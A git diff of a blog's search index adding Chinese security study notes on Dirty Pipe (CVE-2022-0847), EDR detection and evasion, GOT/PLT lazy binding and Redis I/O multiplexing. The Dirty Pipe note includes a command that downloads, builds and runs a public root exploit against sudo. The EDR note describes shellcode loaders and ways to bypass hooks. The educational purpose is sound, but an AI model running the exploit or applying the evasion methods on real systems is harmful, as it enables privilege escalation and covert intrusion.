@@ -1004,6 +1004,41 @@ os_arch、http-stager 块
       </tags>
   </entry>
   <entry>
+    <title>CVE-2022-0847</title>
+    <url>/2025/04/11/CVE-2022-0847/</url>
+    <content><![CDATA[CVE-2022-0847漏洞原理管道(pipe)pipe是linux内核提供的一个通信管道，可以通过pipe()函数创建，通过pipe()函数可以获取到两个文件描述符，分别负责接受数据和发送数据。pipe是以页的形式进行管理，通常pipe缓存空间总长度为65536字节，也就是16页,16个页以数组的方式进行存储，组成一个环形链表的结构(pipe-&gt;bufs[0]~pipe-&gt;bufs[15])，pipe有两个链表指针，一个负责写(pipe-&gt;head)，一个用来读(pipe-&gt;tail)。
+通过对pipe进行写操作时，会调用到pipe的pipe_write()函数，下面主要对该函数进行简单介绍：该函数中存在两个逻辑：
+
+如果当前负责写的链表指针(pipe-&gt;head)指向的页的flags标志位存在PIPE_BUF_FLAG_CAN_MERGE，并且写入指定长度后不会出现跨页，那么就会继续往这个页中写入数据。
+如果不能在当前页续写，就会重新申请一个页，并且新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE至于为什么第二点要把新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE，因为对于pipe来说，默认状态下是允许对页进行续写的，这样可以节省空间。
+
+Linux内核page cache机制linux 文件缓存页(page cache)是Linux内核中用于缓存文件系统数据的一种机制，当一个进程访问一个文件时，内核会首先检查这个文件是否已经被缓存到页缓存中。如果文件已经被缓存，则内核会直接从页缓存中读取数据并返回给进程，避免了从磁盘中读取数据的开销。如果文件没有被缓存，则内核会将文件的数据读取到页缓存中，并从缓存中返回数据给进程，以提高性能。文件缓存页会在内核层的内存中存留一段时间(可能会一直持续到下次重启电脑)。
+splice()系统调用splice()系统调用是零拷贝技术的其中一种，可以自行学习零拷贝相关知识，但在此处对理解漏洞影响不大。splice零拷贝的方式就是，直接让pipe的缓存页指向文件缓存页，也就是使pipe-&gt;bufs[x]-&gt;page直接指向page cache。这一部分主要由splice()系统调用下的copy_page_to_iter_pipe()函数来实现但是copy_page_to_iter_pipe()函数中，在将pipe的缓存页指向文件缓存页后，并没有把pipe的缓存页的flags标志位初始化，形成了一个未初始化漏洞。
+漏洞场景为什么说这是一个漏洞？考虑这样一个情景：
+
+申请一个pipe，并且向其中写入数据，把pipe的16个页全部写满一遍，那么根据pipe的pipe_write()函数的第二个逻辑，整个pipe的16个缓存页的flags标志位都会设置PIPE_BUF_FLAG_CAN_MERGE
+再通过读操作，把pipe的全部内容读取一遍，此时pipe将会被认定为一个空的管道(pipe是一个环形链表，全部读一遍之后两个链表指针又回到了初始状态)，但是pipe中的16个缓存页的flags标志位依旧设置有PIPE_BUF_FLAG_CAN_MERGE，并没有被清除掉。
+然后通过splice()系统调用，将文件A的文件缓存页传递给pipe的缓存页，假设该pipe的缓存页为pipe-&gt;bufs[2]，那么此时pipe-bufs[2]的flags依旧设置有PIPE_BUF_FLAG_CAN_MERGE，也就是说，如果继续向pipe写入数据，并且写入数据长度不会出现跨页的情况，就能继续向bufs[2]里续写，尽管bufs[2]此刻已被判断为是文件A
+继续向pipe中写入一段数据，只要写入的长度不会导致跨页，就会直接对内核中的文件缓存页的内容进行修改，之后如果访问文件A，那么根据Linux内核page cache机制，将会直接获取到内存中的文件A的内容。相当于实现了对可读文件暂时性的任意写的功能。
+
+其实上述的情景就是一些EXP的攻击思路了，如果能够理解这个情景将会对之后理解EXP有很大帮助。
+漏洞复现wget https://haxx.in/files/dirtypipez.cgcc dirtypipez.c -o dirtypipez./dirtypipez `which sudo`
+
+
+
+漏洞利用脚本分析查看https://haxx.in/files/dirtypipez.c的源码进行分析：
+prepare_pipe()函数负责将pipe的全部缓存页的flags设置PIPE_BUF_FLAG_CAN_MERGE,其实就是做了上述情景的前两步hax()函数负责向指定文件写入指定的内容，其思路与上述情景一致通过向具有SUID特权位的文件(这也是使用which sudo作为参数的原因)写入内容，然后执行，实现任意代码执行的效果。
+漏洞修复漏洞根本原因在于splice()系统调用的copy_page_to_iter_pipe()函数没有初始化flags，因此在其中加入这样一行代码即可：
+buf-&gt;flags=0;
+
+]]></content>
+      <tags>
+        <tag>Linux Kernel</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2021-3156</title>
     <url>/2025/04/17/CVE-2021-3156/</url>
     <content><![CDATA[漏洞原理在sudo的parse_args()函数中，重写了argv，将命令行的参数存储到cmnd中(587-595行)，将参数中的字母数字_-$以外的字符，也就是元字符，前面加上反斜杠\来转义处理（590-591行）
@@ -1117,6 +1152,281 @@ cp /root/sudo-1.8.21/src/sudo /root/sudo-custom/usr/local/bin/sudocp /root/sudo-
       <tags>
         <tag>漏洞分析</tag>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EDR</title>
+    <url>/2025/04/30/EDR/</url>
+    <content><![CDATA[简介EDR是什么EDR（Endpoint Detection and Response）是一种部署在终端设备上的代理程序，通过监控操作系统生成的事件来识别攻击行为。一旦检测到威胁，EDR会生成警报并将其发送到SIEM或SOAR系统，由人类分析师进行进一步处理。不过EDR也能自行拦截。了解EDR的输入（即它接收到的数据）对于理解其检测机制至关重要
+Shellcode加载器Shellcode加载器的作用是将加密的Shellcode（通常是CobaltStrike、Sliver或Metasploit的Beacon）加载到内存中并执行。加载器的目标是在初始访问阶段（Initial Access）不被EDR检测到。典型的加载过程包括：
+
+分配一个具有读写权限的内存区域
+将Shellcode复制到该区域并解密
+将内存区域的权限更改为可执行
+执行Shellcode
+
+这种方法的变体包括将Shellcode注入到远程进程中，或通过创建新线程来执行Shellcode。这些操作可能会引起EDR的注意，因此需要谨慎处理。
+EDR检测机制三足鼎立有三种主要的检测技术：
+
+文件扫描：文件的签名扫描（如yara）
+内存扫描：进程内存的签名扫描（如yara）
+行为检测：进程的行为（主要是通过操作系统）
+
+
+文件扫描
+大多数C2生成的exe的签名都是能被EDR检测到的，因此第一步是混淆exe中的代码，这样不会触发签名，比如可以参考
+https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/
+或者，使用加载器，可以将payload加密，这种情况下唯一需要从 AV 文件签名扫描中混淆的是 loader 本身
+内存扫描
+内存扫描可以针对加载器，因为payload必须在内存中解密才能执行。为避免在内存中检测到，进程需要在休眠时加密其内存区域。然后，在 EDR 扫描进程时，内存中不应有任何可疑内容。内存扫描是一项性能密集型作，只有在 EDR 认为值得时才会执行，并不是高频率的。
+行为检测
+EDR会关联分析进程的行为，比如更改内存权限、创建进程和线程、复制内存等，例如，如果使用加载器绕过 AV，并简单地为 shellcode 分配一个内存区域，那么不会给EDR太多的行为。但是 payload 将被内存扫描器检测到。如果引入内存加密来绕过内存扫描器，那么我们会有更多的可疑行为。也就是说文件扫描、内存扫描、行为检测这三者之间会有一个微妙的平衡，不可兼得。
+EDR接收行为数据的来源主要有这些：
+
+用户态（挂钩 API）
+内核态（ETW、ETW-TI、内核回调）
+AMSI内容检测
+
+当添加&#x2F;删除&#x2F;更改某些内容时，这些传感器将创建有关系统中发生的事情的事件，例如：
+
+文件
+注册表项
+进程、线程
+内存
+
+需要注意的是，EDR 本身是看不到进程中的数据修改的。或者换句话说，调用 ntdll.dll 的函数 RtlCopyMemory() 的进程可能会生成行为数据，因为 ntdll.dll 可以被hook。但是如果在 for 循环中对字节复制执行相同的作不会产生任何行为数据。
+EDR的行为数据主要来自于被hook的ntdll.dll以及内核，主要是通过ETW，用户态的hook可以很容易地被删除绕过，但是这个行为也会生成行为记录，来自内核态的行为数据更可信，无法被删除绕过。
+签名扫描（静态特征匹配）类似传统的杀软，比如通过yara进行扫描
+模拟执行在静态特征匹配之后，EDR会进行模拟执行，模拟执行不是在真实机子上跑的，也不是虚拟化执行，而是EDR有自己实现了一套CPU模拟，会读取.text里的汇编，自己实现了主要的windwos api，然后解析跑程序，类似shellcode加载器，起初shellcode是加密的，此时可能在内存中就解密了，EDR此时进行内存扫描可以匹配特征。不过EDR的模拟执行不是一直运行的，一般会下面这些限制：
+
+运行时间
+指令数量
+API调用数量
+内存占用
+
+事件一旦可执行文件通过了防病毒的签名和仿真扫描，它就可以执行。在执行过程中，进程与操作系统内核交互，例如打开文件、创建网络连接等。这些交互会生成事件，被EDR接收和分析。
+EDR通过两种主要渠道接收数据：
+
+用户模式钩子：拦截用户模式下的API调用
+内核回调：使用ETW（事件跟踪）和内核模式回调函数获取事件
+
+这些事件包括文件、注册表、进程、线程和内存区域的创建、删除和修改等。EDR根据这些事件应用规则，以检测恶意行为
+用户态HookEDR可以在用户模式下钩住API函数，例如在ntdll.dll中插入钩子。这些钩子可以被攻击者绕过，例如使用直接系统调用或恢复原始的ntdll.dll。然而，绕过钩子的行为本身可能会引起EDR的注意。
+ntdll.dll是windows最底层的库，这个库可以帮我们进行syscall调用，其他的WindowsAPI或库，最后都会直接或间接地调用ntdll.dll，所以EDR都会在ntdll.dll进行hook，而其他的链接库则不一定会做hook，毕竟最终还会过来。
+这是通过使用内核回调 （PsSetCreateProcessNotifyRoutine）在早期阶段创建新进程时收到通知来实现的，然后将 DLL 注入到进程中（如 amsi.dll），创建一个 APC，该 APC 调用 DLL 的函数，该函数hook原始 ntdll.dll 函数（或通常为 DLL 导入地址表）以通过使用异步过程调用（kKAPC 注入）绕道进入 amsi.dll。
+因此，在hook ntdll.dll 后，每个函数调用都会被 amsi.dll 拦截。
+用户态的hook并不可靠，可以通过以下方式绕过：
+
+直接系统调用（避免调用 ntdll.dll）
+间接系统调用（调用 ntdll.dll 函数，但在hook之后）
+unhook
+
+内核分析Windows操作系统提供了多种内核级别的通知回调机制，例如PsSetCreateProcessNotifyRoutine、PsSetCreateThreadNotifyRoutine等。这些回调函数可以通知EDR有关进程和线程的创建、终止等事件。由于这些回调是在内核中实现的，攻击者难以绕过。
+EDR还可以使用ETW（事件跟踪）来获取更详细的事件信息，例如进程加载的模块、内存映射等。这些信息有助于EDR进行更深入的行为分析。
+内存分析进程的内存区域可以分为两类：
+
+映像区域（IMAGE&#x2F;Backed）：这些区域是从磁盘上的可执行文件映射到内存中的，通常被认为是可信的
+私有区域（USER&#x2F;PRIVATE&#x2F;Unbacked）：这些区域是进程在运行时分配的，可能包含Shellcode或其他恶意代码，因此被认为是不可信的
+
+EDR可以通过分析内存区域的属性，例如权限、类型等，来识别潜在的恶意行为。例如，具有读、写和执行权限的私有内存区域（RWX）可能是Shellcode的存储位置。
+由于内存扫描是性能密集型操作，通常只有在EDR检测到可疑行为时才会触发。攻击者可以通过在进程空闲时加密内存中的Shellcode，以规避内存扫描。
+查询进程信息EDR可以查询进程的详细信息，例如通过GetProcessInformation或NtQueryInformationProcess获取进程的PEB（Process Environment Block）和EPROCESS结构。这些结构包含进程的映像名称、命令行参数、父进程ID等信息。攻击者可以尝试伪造这些信息，但EDR可以通过比较事件中的信息和实际的内核数据结构来检测伪造行为。
+调用栈分析EDR可以分析进程的调用栈，以识别异常行为。例如，一个正常的调用栈可能包括应用程序函数、kernel32.dll中的API函数、ntdll.dll中的系统调用等。如果调用栈中出现了来自非映像区域的函数。
+线程状态分析这块没看懂，博客写的是
+Threads can be sleeping for different reasons. Investigating the state, and how the thread got there due his callstack, we find indicators for sleeping beacons, or memory encryption.
+If memory encryption is being used, the thread is usually put to sleep by calling either:
+
+Kernelbase.dll!SleepEx
+ntdll.dll!NtDelayExecution
+
+Suspicious things for calls to these sleep functions:
+
+Calls to virtual memory in the callstack
+Source in non-backed memory regions
+
+性能影响EDR 的性能至关重要，假如通过npm安装10000个包，EDR要是给他们全部扫描一遍导致速度缓慢，那用户可能就放弃windows使用apple了，因此对EDR来说，不是针对所有程序都要进行全方位扫描的。
+性能影响大概是这样排级
+
+
+
+对性能的影响（越小代表越少）
+操作
+
+
+
+1
+单个行为事件
+
+
+3
+行为事件关联
+
+
+10
+查询进程信息
+
+
+100
+内存扫描
+
+
+1000
+文件扫描
+
+
+什么时候会触发内存扫描呢？
+
+
+
+API
+触发扫描
+备注
+
+
+
+VirtualAlloc()
+不触发
+除了RWX以外，都是正常操作，不会触发
+
+
+WriteProcessMemory()
+不触发
+正常操作
+
+
+memcpy()
+不触发
+不清楚啥情况，博客中说的是对EDR不可见
+
+
+VirtualProtect
+看情况
+RWX或者是从RW到RX的情况可能会触发，其他情况不会触发
+
+
+CreateRemoteThread()
+触发
+很可能会触发
+
+
+]]></content>
+      <tags>
+        <tag>EDR</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux延迟绑定</title>
+    <url>/2025/04/10/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
+    <content><![CDATA[Windows 下.lib .dll .obj .exe.lib 是静态链接文件
+.dll 是动态链接文件
+.obj 是编译时生成的中间代码文件，比如一个项目有多个.c 文件，编译时会先全部生成为中间 obj 文件，然后在进行链接生成最终的 exe 文件
+.exe 文件是可执行文件
+Linux 下.o .so .a.o 类似于 Windows 下的.obj 文件，是编译中间产物
+.so 是动态链接文件
+.a 是静态链接文件,可通过如下命令将中间文件加进 output.a 或者新生成一个 output.a
+创建.a的命令ar rcx output.a test1.o test2.o
+
+Linux 延迟绑定机制使用的 C 语言例子//-------------------------------------------------------------------// FileName: test1.c// Author: hexuelin// Copyright (c) UnionTech.//-------------------------------------------------------------------#include &lt;stdio.h&gt;void stack_overflow()&#123; char buf[64] = &#123;0&#125;; scanf(&quot;%s&quot;, &amp;buf); printf(&quot;hello %s\n&quot;, &amp;buf);&#125;void get_shell()&#123; system(&quot;/bin/sh&quot;);&#125;int main(int argc, char const *argv[])&#123; stack_overflow(); return 0;&#125;
+
+静态链接和动态链接静态链接在编译时把需要用到的内容都链接到文件中
+动态链接则是会在程序执行时再进行链接
+因此静态链接明显会比动态链接文件要大，同样的执行速度也会更快
+#编译时加上-static参数就是静态链接gcc title.c -o title_static -static#不加参数默认就是动态链接gcc title.c -o title
+
+
+
+部分寄存器以及部分汇编指令下面的汇编指令，部分用其他指令替代作为解释，但是实际上并不能用替代的指令，比如 rip,rsp 寄存器，原则上并不允许直接对他们进行操作
+
+rip
+
+指向下一条要执行的命令（还没有执行）
+push 1
+
+rsp
+
+栈顶
+
+rbp
+
+栈底
+
+mov rax,1
+
+rax&#x3D;1
+
+add rax,1
+
+rax&#x3D;rax+1
+
+push rax
+
+add rsp,一个字长（64位一个字长就是64位，8字节）mov [rsp],rax
+
+
+jmp 0x6666
+
+mov rip,0x6666
+
+
+call printf@plt 
+
+#printf@plt是一个地址,这个地址的备注名叫做printf@pltpush ripjmp printf@plt
+
+
+leave
+
+mov rsp,rbppop rbp
+
+
+retn
+
+pop rip
+
+libc.so.6libc 是 Stantard C Library 的简称，它是符合 ANSI C 标准的一个标准函数库。
+在 Linux 操作系统下所说的 libc 即 glibc。glibc 是类 Unix 操作系统中使用最广泛的 libc 库，它的全称是 GNU C Library.
+PLT 和 GOTPLT表称为过程链接表（procedure linkage table）
+GOT表称为全局偏移量表（global offset table）
+用不太严谨的话来概况，首先可以这么理解：
+GOT表中存储真正的函数地址
+PLT表中存储的是GOT表中的地址
+调用函数时会先到PLT表，再由PLT表导向GOT表
+**GOT[0]**包含.dynamic 段的地址，.dynamic 段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息
+**GOT[1]**包含动态链接器的标识
+**GOT[2]**包含动态链接器的延迟绑定代码的入口点，也就是调用_dl_runtime_resolve 函数，延迟绑定的时候要调用的函数
+printf 第一次调用的时候 got 表中是没有实际地址的， 第一次调用 printf 的时候  ，最终会调用_dl_runtime_resolve 函数，这个函数的作用就是把 prtinf 函数的实际地址写入到 GOT 表中，之后如果第二次，第三次。。。调用 printf 的时候就能从 GOT 表直接获取到 printf 的地址了
+GOT表中正式的函数地址要从 GOT[3]开始，也就是第四项
+举例：PLT 表中 printf@plt 
+jmp printf@got.pltpush printf在got表中的编号jmp plt表第一行指令
+
+举例: GOT 表中 printf@got.plt 
+第一次执行printf时：PLT表中printf@plt的第二行第二三四次执行printf时：动态链接库libc中函数printf的真实地址
+
+延迟绑定机制下,函数初次调用流程图
+IDA 查看 PLT 表
+IDA 查看 GOT 表
+.plt     .got    .got.plt这三者是 ELF 文件格式中的节(section)
+.plt 就是 PLT 表
+.got 和.got.plt 统称为 GOT 表
+.got 里面直接存储的就是函数调用的地址，部分函数地址是直接存放在.got 里面的
+PLT 表指向的是.got.plt
+printf@plt 指向的就是 printf@got.plt
+第一次调用时printf@got.plt里指向的是 printf@plt 的下一行也就是 push printf 对应的 got 表里的序号
+放在.got 里的相当于.got.plt 第一次调用之后的状态
+RELRO#关闭RELROgcc title.c -o title_no -z norelro#部分开启RELRO(Partial RELRO不加参数默认是这个)gcc title.c -o title_partial -z lazy#完全开启RELRO(Full RELRO)gcc title.c -o title_full -z now
+
+
+RELRO，堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术。
+由于 GOT 和 PLT 以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过 PLT 表进行的，解析完成后，相应的 GOT 条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt 必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。
+RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免 GOT 上的地址被篡改。RELRO 有两种形式：
+partial RELRO：一些段（包括.dynamic,.got 等）在初始化后会被标记为只读。在 unbuntu16.04（GCC-5.4.0）上，默认开启 Partial RELRO。
+Full RELRO ：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt 段会被完全初始化为目标函数的最终地址，并被 mprotect 标记为只读，但其实.got.plt 会被直接合并到.got，也就看不到这段了。另外 link_map 和_dl_runtime_reolve 的地址也不会被装入。开启 Full RELRO 会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改 GOT。
+
+
+
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>二进制</tag>
       </tags>
   </entry>
   <entry>
@@ -1836,153 +2146,950 @@ AggregateFunction(uniq, UInt64) AS uv
       </tags>
   </entry>
   <entry>
-    <title>Linux延迟绑定</title>
-    <url>/2025/04/10/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
-    <content><![CDATA[Windows 下.lib .dll .obj .exe.lib 是静态链接文件
-.dll 是动态链接文件
-.obj 是编译时生成的中间代码文件，比如一个项目有多个.c 文件，编译时会先全部生成为中间 obj 文件，然后在进行链接生成最终的 exe 文件
-.exe 文件是可执行文件
-Linux 下.o .so .a.o 类似于 Windows 下的.obj 文件，是编译中间产物
-.so 是动态链接文件
-.a 是静态链接文件,可通过如下命令将中间文件加进 output.a 或者新生成一个 output.a
-创建.a的命令ar rcx output.a test1.o test2.o
-
-Linux 延迟绑定机制使用的 C 语言例子//-------------------------------------------------------------------// FileName: test1.c// Author: hexuelin// Copyright (c) UnionTech.//-------------------------------------------------------------------#include &lt;stdio.h&gt;void stack_overflow()&#123; char buf[64] = &#123;0&#125;; scanf(&quot;%s&quot;, &amp;buf); printf(&quot;hello %s\n&quot;, &amp;buf);&#125;void get_shell()&#123; system(&quot;/bin/sh&quot;);&#125;int main(int argc, char const *argv[])&#123; stack_overflow(); return 0;&#125;
-
-静态链接和动态链接静态链接在编译时把需要用到的内容都链接到文件中
-动态链接则是会在程序执行时再进行链接
-因此静态链接明显会比动态链接文件要大，同样的执行速度也会更快
-#编译时加上-static参数就是静态链接gcc title.c -o title_static -static#不加参数默认就是动态链接gcc title.c -o title
-
-
-
-部分寄存器以及部分汇编指令下面的汇编指令，部分用其他指令替代作为解释，但是实际上并不能用替代的指令，比如 rip,rsp 寄存器，原则上并不允许直接对他们进行操作
-
-rip
-
-指向下一条要执行的命令（还没有执行）
-push 1
-
-rsp
-
-栈顶
-
-rbp
-
-栈底
-
-mov rax,1
-
-rax&#x3D;1
-
-add rax,1
-
-rax&#x3D;rax+1
-
-push rax
-
-add rsp,一个字长（64位一个字长就是64位，8字节）mov [rsp],rax
-
-
-jmp 0x6666
-
-mov rip,0x6666
-
-
-call printf@plt 
-
-#printf@plt是一个地址,这个地址的备注名叫做printf@pltpush ripjmp printf@plt
-
-
-leave
-
-mov rsp,rbppop rbp
-
-
-retn
-
-pop rip
-
-libc.so.6libc 是 Stantard C Library 的简称，它是符合 ANSI C 标准的一个标准函数库。
-在 Linux 操作系统下所说的 libc 即 glibc。glibc 是类 Unix 操作系统中使用最广泛的 libc 库，它的全称是 GNU C Library.
-PLT 和 GOTPLT表称为过程链接表（procedure linkage table）
-GOT表称为全局偏移量表（global offset table）
-用不太严谨的话来概况，首先可以这么理解：
-GOT表中存储真正的函数地址
-PLT表中存储的是GOT表中的地址
-调用函数时会先到PLT表，再由PLT表导向GOT表
-**GOT[0]**包含.dynamic 段的地址，.dynamic 段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息
-**GOT[1]**包含动态链接器的标识
-**GOT[2]**包含动态链接器的延迟绑定代码的入口点，也就是调用_dl_runtime_resolve 函数，延迟绑定的时候要调用的函数
-printf 第一次调用的时候 got 表中是没有实际地址的， 第一次调用 printf 的时候  ，最终会调用_dl_runtime_resolve 函数，这个函数的作用就是把 prtinf 函数的实际地址写入到 GOT 表中，之后如果第二次，第三次。。。调用 printf 的时候就能从 GOT 表直接获取到 printf 的地址了
-GOT表中正式的函数地址要从 GOT[3]开始，也就是第四项
-举例：PLT 表中 printf@plt 
-jmp printf@got.pltpush printf在got表中的编号jmp plt表第一行指令
-
-举例: GOT 表中 printf@got.plt 
-第一次执行printf时：PLT表中printf@plt的第二行第二三四次执行printf时：动态链接库libc中函数printf的真实地址
-
-延迟绑定机制下,函数初次调用流程图
-IDA 查看 PLT 表
-IDA 查看 GOT 表
-.plt     .got    .got.plt这三者是 ELF 文件格式中的节(section)
-.plt 就是 PLT 表
-.got 和.got.plt 统称为 GOT 表
-.got 里面直接存储的就是函数调用的地址，部分函数地址是直接存放在.got 里面的
-PLT 表指向的是.got.plt
-printf@plt 指向的就是 printf@got.plt
-第一次调用时printf@got.plt里指向的是 printf@plt 的下一行也就是 push printf 对应的 got 表里的序号
-放在.got 里的相当于.got.plt 第一次调用之后的状态
-RELRO#关闭RELROgcc title.c -o title_no -z norelro#部分开启RELRO(Partial RELRO不加参数默认是这个)gcc title.c -o title_partial -z lazy#完全开启RELRO(Full RELRO)gcc title.c -o title_full -z now
-
-
-RELRO，堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术。
-由于 GOT 和 PLT 以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过 PLT 表进行的，解析完成后，相应的 GOT 条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt 必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。
-RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免 GOT 上的地址被篡改。RELRO 有两种形式：
-partial RELRO：一些段（包括.dynamic,.got 等）在初始化后会被标记为只读。在 unbuntu16.04（GCC-5.4.0）上，默认开启 Partial RELRO。
-Full RELRO ：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt 段会被完全初始化为目标函数的最终地址，并被 mprotect 标记为只读，但其实.got.plt 会被直接合并到.got，也就看不到这段了。另外 link_map 和_dl_runtime_reolve 的地址也不会被装入。开启 Full RELRO 会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改 GOT。
-
-
-
+    <title>Hey, there~</title>
+    <url>/2025/03/18/%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[介绍Hey, there~
+使用的 hexo + butterfly 生成的静态页面,部署在 Github 个人主页
+之后应该会记录一些自己的学习笔记
+主要学习和工作方向是安全研发,但是目前工作内容很杂,因此记录的内容也会涉及不同的领域
 ]]></content>
       <tags>
-        <tag>Linux</tag>
-        <tag>二进制</tag>
+        <tag>闲话</tag>
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-0847</title>
-    <url>/2025/04/11/CVE-2022-0847/</url>
-    <content><![CDATA[CVE-2022-0847漏洞原理管道(pipe)pipe是linux内核提供的一个通信管道，可以通过pipe()函数创建，通过pipe()函数可以获取到两个文件描述符，分别负责接受数据和发送数据。pipe是以页的形式进行管理，通常pipe缓存空间总长度为65536字节，也就是16页,16个页以数组的方式进行存储，组成一个环形链表的结构(pipe-&gt;bufs[0]~pipe-&gt;bufs[15])，pipe有两个链表指针，一个负责写(pipe-&gt;head)，一个用来读(pipe-&gt;tail)。
-通过对pipe进行写操作时，会调用到pipe的pipe_write()函数，下面主要对该函数进行简单介绍：该函数中存在两个逻辑：
+    <title>Redis</title>
+    <url>/2025/04/03/Redis/</url>
+    <content><![CDATA[I&#x2F;O多路复用是什么I&#x2F;O 多路复用（I&#x2F;O Multiplexing）是一种使得单个线程（或进程）能够同时监控多个 I&#x2F;O 操作的技术，它可以让程序有效地处理多个 I&#x2F;O 操作（如读取文件或网络连接）而无需为每个操作创建一个独立的线程或进程。I&#x2F;O 多路复用的核心思想是在一个线程内，能够同时处理多个 I&#x2F;O 操作，避免了频繁的线程切换和进程创建，从而提高了系统的性能和资源利用率。
+在没有 I&#x2F;O 多路复用机制的情况下，当程序需要等待多个 I&#x2F;O 操作时（比如等待多个网络连接的读取操作），通常会采取阻塞方式，直到每个操作完成。这样每个操作都会阻塞当前线程，导致系统资源浪费。I&#x2F;O 多路复用通过在一个线程内同时监听多个 I&#x2F;O 操作，使得线程在等待 I&#x2F;O 操作完成时可以继续做其他工作。
+I&#x2F;O 多路复用的工作原理I&#x2F;O 多路复用的基本原理是，程序通过一个系统调用（如 select、poll、epoll 等）将多个文件描述符注册到内核中，内核在这些文件描述符上的 I&#x2F;O 事件发生时通知程序。程序通过查询这些文件描述符的状态，确定哪些可以进行读写操作。
+具体流程如下：
 
-如果当前负责写的链表指针(pipe-&gt;head)指向的页的flags标志位存在PIPE_BUF_FLAG_CAN_MERGE，并且写入指定长度后不会出现跨页，那么就会继续往这个页中写入数据。
-如果不能在当前页续写，就会重新申请一个页，并且新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE至于为什么第二点要把新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE，因为对于pipe来说，默认状态下是允许对页进行续写的，这样可以节省空间。
+注册文件描述符：应用程序通过某种方式（如 select、poll、epoll 等）将需要监控的文件描述符注册到操作系统内核。
+等待 I&#x2F;O 事件：应用程序进入等待状态，等待内核通知哪些文件描述符有事件（例如数据可读、可写或异常）。
+事件发生时处理 I&#x2F;O 操作：一旦某个文件描述符有 I&#x2F;O 事件发生，内核会通知程序，程序可以读取或写入数据，或处理相应的 I&#x2F;O 操作。
+重复等待：程序处理完事件后，继续进入等待状态，直到下一个事件发生。
 
-Linux内核page cache机制linux 文件缓存页(page cache)是Linux内核中用于缓存文件系统数据的一种机制，当一个进程访问一个文件时，内核会首先检查这个文件是否已经被缓存到页缓存中。如果文件已经被缓存，则内核会直接从页缓存中读取数据并返回给进程，避免了从磁盘中读取数据的开销。如果文件没有被缓存，则内核会将文件的数据读取到页缓存中，并从缓存中返回数据给进程，以提高性能。文件缓存页会在内核层的内存中存留一段时间(可能会一直持续到下次重启电脑)。
-splice()系统调用splice()系统调用是零拷贝技术的其中一种，可以自行学习零拷贝相关知识，但在此处对理解漏洞影响不大。splice零拷贝的方式就是，直接让pipe的缓存页指向文件缓存页，也就是使pipe-&gt;bufs[x]-&gt;page直接指向page cache。这一部分主要由splice()系统调用下的copy_page_to_iter_pipe()函数来实现但是copy_page_to_iter_pipe()函数中，在将pipe的缓存页指向文件缓存页后，并没有把pipe的缓存页的flags标志位初始化，形成了一个未初始化漏洞。
-漏洞场景为什么说这是一个漏洞？考虑这样一个情景：
+为什么需要 I&#x2F;O 多路复用？I&#x2F;O 多路复用的目标是提高并发性和系统性能，尤其是在以下几种场景下：
 
-申请一个pipe，并且向其中写入数据，把pipe的16个页全部写满一遍，那么根据pipe的pipe_write()函数的第二个逻辑，整个pipe的16个缓存页的flags标志位都会设置PIPE_BUF_FLAG_CAN_MERGE
-再通过读操作，把pipe的全部内容读取一遍，此时pipe将会被认定为一个空的管道(pipe是一个环形链表，全部读一遍之后两个链表指针又回到了初始状态)，但是pipe中的16个缓存页的flags标志位依旧设置有PIPE_BUF_FLAG_CAN_MERGE，并没有被清除掉。
-然后通过splice()系统调用，将文件A的文件缓存页传递给pipe的缓存页，假设该pipe的缓存页为pipe-&gt;bufs[2]，那么此时pipe-bufs[2]的flags依旧设置有PIPE_BUF_FLAG_CAN_MERGE，也就是说，如果继续向pipe写入数据，并且写入数据长度不会出现跨页的情况，就能继续向bufs[2]里续写，尽管bufs[2]此刻已被判断为是文件A
-继续向pipe中写入一段数据，只要写入的长度不会导致跨页，就会直接对内核中的文件缓存页的内容进行修改，之后如果访问文件A，那么根据Linux内核page cache机制，将会直接获取到内存中的文件A的内容。相当于实现了对可读文件暂时性的任意写的功能。
+高并发：当需要同时处理大量 I&#x2F;O 操作（比如网络请求、文件操作等）时，创建一个线程或进程来处理每个请求可能会消耗大量系统资源，而 I&#x2F;O 多路复用通过共享一个线程来处理多个 I&#x2F;O 操作，大大减少了资源消耗。
+减少阻塞：传统的 I&#x2F;O 操作通常是阻塞的，程序会一直等待 I&#x2F;O 操作完成，直到可以读取或写入数据。而 I&#x2F;O 多路复用使得程序在等待 I&#x2F;O 操作时不会被阻塞，可以同时处理多个 I&#x2F;O 请求，提高效率。
